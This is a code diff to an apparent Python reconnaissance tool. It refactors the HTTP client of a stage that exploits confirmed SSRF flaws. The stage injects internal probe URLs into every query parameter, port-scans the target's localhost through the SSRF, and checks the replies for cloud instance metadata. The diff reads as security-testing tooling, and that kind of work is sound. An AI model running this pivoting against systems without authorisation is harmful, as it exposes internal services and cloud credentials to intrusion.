@@ -1,11 +1,13 @@
 from __future__ import annotations
 
-import httpx
-from typing import Dict, List, Any
+import time
+import asyncio
+from typing import Dict, List, Any, Optional
 from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl
 
 from recon_cli.pipeline.context import PipelineContext
 from recon_cli.pipeline.stage_base import Stage
+from recon_cli.utils.async_http import AsyncHTTPClient, HTTPClientConfig
 
 
 class SSRFPivotStage(Stage):
@@ -42,7 +44,15 @@ class SSRFPivotStage(Stage):
 
         context.logger.info("Found %d confirmed SSRF(s). Starting internal pivoting & port scanning...", len(verified_ssrf))
         
-        async with httpx.AsyncClient(verify=False, timeout=10) as client:
+        runtime = context.runtime_config
+        config = HTTPClientConfig(
+            max_concurrent=15,
+            total_timeout=10.0,
+            verify_ssl=bool(getattr(runtime, "verify_tls", True)),
+            requests_per_second=20.0
+        )
+
+        async with AsyncHTTPClient(config) as client:
             for ssrf in verified_ssrf:
                 url = ssrf.get("url")
                 if not url: continue
@@ -53,40 +63,36 @@ class SSRFPivotStage(Stage):
                 # 2. Test internal port scan
                 await self._scan_internal_ports(context, client, url)
 
-    async def _scan_internal_ports(self, context: PipelineContext, client: httpx.AsyncClient, url: str) -> None:
+    async def _scan_internal_ports(self, context: PipelineContext, client: AsyncHTTPClient, url: str) -> None:
         """Attempts to scan internal ports via the SSRF vulnerability."""
         base_host = "127.0.0.1"
         for port in self.COMMON_PORTS:
             probe = f"http://{base_host}:{port}"
             test_url = self._inject_probe(url, probe)
             try:
-                # Use a shorter timeout for port scanning to detect differences
-                start = time.time()
-                resp = await client.get(test_url, timeout=5)
-                duration = time.time() - start
+                start = time.monotonic()
+                resp = await client.get(test_url)
+                duration = time.monotonic() - start
                 
-                # Indicators of an open port:
-                # 1. 200 OK or other non-error status
-                # 2. Significant time difference (timeout vs immediate reset)
-                if resp.status_code < 500 or duration > 4.5:
-                    self._report_pivot(context, url, probe, f"Port {port} potentially OPEN (Status: {resp.status_code})")
+                # Indicators of an open port
+                if resp.status < 500 or duration > 4.5:
+                    self._report_pivot(context, url, probe, f"Port {port} potentially OPEN (Status: {resp.status})")
             except Exception: pass
 
-    async def _pivot_internal(self, context: PipelineContext, client: httpx.AsyncClient, url: str) -> None:
+    async def _pivot_internal(self, context: PipelineContext, client: AsyncHTTPClient, url: str) -> None:
         for probe in self.INTERNAL_PROBES:
             test_url = self._inject_probe(url, probe)
             try:
                 resp = await client.get(test_url)
                 # Heuristic: If we get a 200 or a specific metadata response, it's a hit!
-                if resp.status_code == 200:
-                    if "ami-id" in resp.text or "instance-id" in resp.text or "localhost" in resp.text:
-                        self._report_pivot(context, url, probe, resp.text[:500])
+                if resp.status == 200:
+                    if any(h in resp.body for h in ["ami-id", "instance-id", "localhost"]):
+                        self._report_pivot(context, url, probe, resp.body[:500])
             except Exception: pass
 
     def _inject_probe(self, url: str, probe: str) -> str:
         parsed = urlparse(url)
         params = parse_qsl(parsed.query, keep_blank_values=True)
-        # Assuming the SSRF was in a parameter, we inject the probe into all of them
         updated = [(k, probe) for k, _ in params]
         return urlunparse(parsed._replace(query=urlencode(updated)))
 
